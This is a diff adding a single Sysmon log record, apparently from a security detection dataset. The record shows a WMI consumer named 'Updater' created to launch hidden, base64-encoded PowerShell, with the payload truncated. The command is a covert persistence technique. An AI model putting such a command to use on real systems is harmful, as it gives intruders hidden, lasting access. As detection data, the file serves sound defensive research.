@@ -1,0 +1,19 @@
+[
+  {
+    "@timestamp": "2020-09-04T20:43:27.440Z",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "Destination": " \"C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NonI -W hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBJAE8ATgBUAGEAQgBMAGUA[...truncated]\"",
+    "EventID": 20,
+    "EventType": "WmiConsumerEvent",
+    "EventTypeOrignal": "INFO",
+    "Hostname": "WORKSTATION5.theshire.local",
+    "Name": " \"Updater\"",
+    "Operation": "Created",
+    "RecordNumber": 385201,
+    "RuleName": "-",
+    "SourceName": "Microsoft-Windows-Sysmon",
+    "Type": "Command Line",
+    "User": "THESHIRE\\pgustavo",
+    "UtcTime": "2020-09-04 20:43:27.015"
+  }
+]
